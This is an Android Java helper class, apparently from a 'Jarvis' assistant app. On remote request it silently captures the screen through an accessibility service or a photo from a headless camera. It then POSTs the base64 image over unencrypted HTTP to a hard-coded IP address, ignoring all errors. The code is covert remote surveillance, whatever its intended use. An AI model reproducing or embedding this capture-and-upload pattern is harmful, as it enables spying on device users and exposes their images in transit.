package com.matheus.jarvis;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Base64;
import android.view.Display;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class JarvisSensoryHelper {
    public static void handleCaptureRequest(Context ctx, String deviceId, String requestId, String modality, String facing) {
        new Thread(() -> {
            String frame = null;
            if ("screen".equalsIgnoreCase(modality)) {
                frame = captureAccessibilityScreen();
            } else {
                frame = JarvisHeadlessCamera.captureBase64(ctx, facing);
            }
            postFrame(requestId, deviceId, frame);
        }).start();
    }

    public static String captureAccessibilityScreen() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || JarvisAccessibilityService.instance == null) return null;
        AtomicReference<String> ref = new AtomicReference<>(null);
        CountDownLatch latch = new CountDownLatch(1);
        try {
            JarvisAccessibilityService.instance.takeScreenshot(
                Display.DEFAULT_DISPLAY,
                JarvisAccessibilityService.instance.getMainExecutor(),
                new android.accessibilityservice.AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(android.accessibilityservice.AccessibilityService.ScreenshotResult res) {
                        try {
                            Bitmap bmp = Bitmap.wrapHardwareBuffer(res.getHardwareBuffer(), res.getColorSpace());
                            if (bmp != null) {
                                Bitmap sw = bmp.copy(Bitmap.Config.ARGB_8888, false);
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                sw.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                                ref.set("data:image/jpeg;base64," + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP));
                                sw.recycle();
                                bmp.recycle();
                            }
                            res.getHardwareBuffer().close();
                        } catch (Exception ignored) {}
                        latch.countDown();
                    }
                    @Override
                    public void onFailure(int errorCode) { latch.countDown(); }
                }
            );
            latch.await(2500, TimeUnit.MILLISECONDS);
        } catch (Exception ignored) {}
        return ref.get();
    }

    private static void postFrame(String requestId, String deviceId, String imageBase64) {
        try {
            URL url = new URL("http://163.176.111.18/api/v1/sensory/frame");
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            c.setDoOutput(true);
            JSONObject body = new JSONObject();
            body.put("requestId", requestId);
            body.put("deviceId", deviceId);
            if (imageBase64 != null) body.put("imageBase64", imageBase64);
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.toString().getBytes("UTF-8"));
            }
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }
}
